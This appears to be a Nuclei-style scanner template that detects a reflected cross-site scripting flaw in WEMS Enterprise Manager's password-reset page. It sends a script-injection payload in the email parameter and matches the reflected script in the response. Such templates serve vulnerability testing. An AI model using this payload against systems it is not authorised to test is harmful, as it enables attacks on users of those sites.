id: wems-manager-xss
info:
  author: pikpikcu
  name: WEMS Enterprise Manager XSS
  reference: '- https://packetstormsecurity.com/files/155777/WEMS-Enterprise-Manager-2.58-Cross-Site-Scripting.html

    '
  severity: medium
  tags: xss
requests:
- matchers:
  - status:
    - 200
    type: status
  - part: body
    type: word
    words:
    - '"><script>confirm(document.domain)</script>'
  - part: header
    type: word
    words:
    - text/html
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/guest/users/forgotten?email=%22%3E%3Cscript%3Econfirm(document.domain)%3C/script%3E'
